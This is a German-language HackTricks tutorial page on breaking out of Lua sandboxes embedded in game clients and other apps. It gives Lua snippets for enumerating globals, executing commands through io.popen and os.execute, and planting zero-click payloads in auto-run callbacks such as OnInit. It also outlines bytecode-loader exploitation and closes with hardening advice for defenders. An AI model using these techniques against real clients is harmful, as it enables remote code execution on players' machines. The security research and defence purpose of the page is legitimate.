# Bypass Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

Diese Seite sammelt praktische Techniken, um Lua "sandboxes" zu enumerieren und auszubrechen, die in Anwendungen eingebettet sind (insbesondere game clients, plugins oder in-app scripting engines). Viele Engines exponieren eine eingeschränkte Lua-Umgebung, lassen jedoch mächtige globals erreichbar, die arbitrary command execution oder sogar native memory corruption ermöglichen, wenn bytecode loaders exponiert sind.

Kernideen:
- Behandle die VM als unbekannte Umgebung: enumerate _G und entdecke, welche gefährlichen primitives erreichbar sind.
- Wenn stdout/print blockiert ist, missbrauche beliebige in-VM UI/IPC-Kanäle als Ausgabe-Senke, um Ergebnisse zu beobachten.
- Wenn io/os exponiert sind, hast du oft direkte Kommandoausführung (io.popen, os.execute).
- Wenn load/loadstring/loadfile exponiert sind, kann das Ausführen speziell erzeugten Lua bytecode die memory safety in einigen Versionen unterlaufen (≤5.1 Verifier sind bypassable; 5.2 entfernte den Verifier) und somit advanced exploitation ermöglichen.

## Sandbox-Umgebung enumerieren

- Gib die globale Umgebung aus, um erreichbare tables/functions zu inventarisieren:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Wenn kein print() verfügbar ist, zweckentfremde in-VM channels. Beispiel aus einer MMO housing script VM, in der Chat-Ausgabe erst nach einem Sound-Aufruf funktioniert; das Folgende baut eine zuverlässige Ausgabefunktion:
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Verallgemeinere dieses Muster für dein Ziel: beliebige textbox, toast, logger oder UI callback, die Strings akzeptieren, können als stdout für reconnaissance dienen.

## Direkte Befehlsausführung, wenn io/os exponiert sind

Wenn die Sandbox weiterhin die Standardbibliotheken io oder os freigibt, hast du wahrscheinlich sofortige Befehlsausführung:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Hinweise:
- Die Ausführung erfolgt innerhalb des Client-Prozesses; viele anti-cheat/antidebug layers, die externe Debugger blockieren, verhindern nicht die Erstellung von Prozessen innerhalb der VM.
- Ebenfalls prüfen: package.loadlib (arbitrary DLL/.so loading), require with native modules, LuaJIT's ffi (if present), und die debug library (kann Privilegien innerhalb der VM erhöhen).

## Zero-click triggers via auto-run callbacks

Wenn die Host-Anwendung Skripte an Clients verteilt und die VM auto-run hooks bereitstellt (z. B. OnInit/OnLoad/OnEnter), platziere dein payload dort für drive-by compromise, sobald das Skript geladen wird:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Any equivalent callback (OnLoad, OnEnter, etc.) verallgemeinert diese Technik, wenn Skripte automatisch an den client übertragen und dort ausgeführt werden.

## Dangerous primitives to hunt during recon

Während der Enumeration von _G, achte speziell auf:
- io, os: io.popen, os.execute, Datei-I/O, Zugriff auf Umgebungsvariablen.
- load, loadstring, loadfile, dofile: führen Source oder Bytecode aus; unterstützen das Laden von nicht vertrauenswürdigem Bytecode.
- package, package.loadlib, require: dynamisches Laden von Libraries und die Moduloberfläche.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo und Hooks.
- LuaJIT-only: ffi.cdef, ffi.load, um nativen Code direkt aufzurufen.

Minimale Nutzungsbeispiele (falls erreichbar):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Optionale Eskalation: Ausnutzen von Lua-Bytecode-Loadern

Wenn load/loadstring/loadfile erreichbar sind, aber io/os eingeschränkt sind, kann die Ausführung von speziell erzeugtem Lua-Bytecode zu Speicheroffenlegung und Korruptionsprimitiven führen. Wesentliche Fakten:
- Lua ≤ 5.1 enthielt einen Bytecode-Verifier, der bekannte Bypässe hat.
- Lua 5.2 entfernte den Verifier vollständig (offizielle Position: Anwendungen sollten vorkompilierte Chunks einfach ablehnen), wodurch die Angriffsfläche größer wird, falls Bytecode-Loading nicht verboten ist.
- Typische Workflows: leak pointers via in-VM output, Bytecode konstruieren, um type confusions zu erzeugen (z. B. rund um FORLOOP oder andere opcodes), und dann zu arbitrary read/write oder native code execution pivotieren.

Dieser Weg ist engine-/versionsspezifisch und erfordert RE. Siehe Referenzen für tiefere Analysen, Exploitation-Primitives und Beispiel-Gadgetry in Spielen.

## Erkennungs- und Härtungshinweise (für Verteidiger)

- Serverseitig: Benutzer-Skripte ablehnen oder umschreiben; allowlist sichere APIs; io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi entfernen oder mit leeren Bindings versehen.
- Clientseitig: Lua mit einem minimalen _ENV ausführen, Bytecode-Loading verbieten, einen strikten Bytecode-Verifier oder Signaturprüfungen wieder einführen und Prozess-Erzeugung aus dem Client-Prozess blockieren.
- Telemetrie: Alarm bei gameclient → child process creation kurz nach dem Laden eines Skripts; korrelieren mit UI/chat/script-Ereignissen.

## Referenzen

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
